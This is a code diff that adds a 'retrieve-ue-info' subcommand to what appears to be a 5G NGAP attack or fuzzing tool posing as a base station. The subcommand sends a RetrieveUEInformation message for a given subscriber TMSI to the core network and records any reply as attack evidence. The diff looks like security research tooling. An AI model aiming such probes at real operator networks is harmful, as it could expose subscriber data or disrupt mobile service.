@@ -380,6 +380,20 @@ def cmd_handover_notify(gnb, a):
     _listen_after(gnb, a, "handover-notify")
 
 
+def cmd_retrieve_ue_info(gnb, a):
+    """Class-2 RetrieveUEInformation. Verdict is whether any NGAP comes back."""
+    gnb.send(B.retrieve_ue_information(a.amf_set_id, a.amf_pointer, a.tmsi), wait=False)
+    print(f"[retrieve-ue-info] sent proc=55 FiveG-S-TMSI "
+          f"set=0x{a.amf_set_id:x} ptr=0x{a.amf_pointer:x} tmsi={a.tmsi}")
+    print("[retrieve-ue-info] spec defines no success response; "
+          "a reply here is Error Indication or another NGAP on this association")
+    _save(a.evidence, {"attack": "retrieve-ue-info",
+                       "amf_set_id": a.amf_set_id,
+                       "amf_pointer": a.amf_pointer,
+                       "tmsi": a.tmsi})
+    _listen_after(gnb, a, "retrieve-ue-info", seconds=8.0)
+
+
 def cmd_nrppa(gnb, a):
     gnb.send(B.uplink_ue_associated_nrppa_transport(a.amf_ue_id, a.ran_ue_id), wait=False)
     print(f"[ul-nrppa] amf={a.amf_ue_id} sent (Class-2)")
@@ -955,6 +969,14 @@ def main():
     s.add_argument("--listen", type=float, default=5.0,
                    help="seconds to listen for DownlinkRANStatusTransfer etc.")
 
+    s = sub.add_parser("retrieve-ue-info")
+    s.add_argument("--amf-set-id", type=lambda x: int(x, 0), required=True,
+                   help="AMF Set ID (10-bit) from this registration's 5G-S-TMSI")
+    s.add_argument("--amf-pointer", type=lambda x: int(x, 0), default=0,
+                   help="AMF Pointer (6-bit)")
+    s.add_argument("--tmsi", required=True,
+                   help="5G-TMSI as 8 hex digits")
+
     for name in ("pdu-notify", "handover-notify", "ul-nrppa", "ul-ran-status"):
         s = sub.add_parser(name)
         s.add_argument("--amf-ue-id", type=int, required=True)
@@ -1044,6 +1066,7 @@ def main():
      "handover-required": cmd_handover_required,
      "ho-window-inject": cmd_ho_window_inject,
      "pdu-notify": cmd_pdu_notify,
+     "retrieve-ue-info": cmd_retrieve_ue_info,
      "handover-notify": cmd_handover_notify,
      "ul-nrppa": cmd_nrppa,
      "cell-trace": cmd_cell_trace,
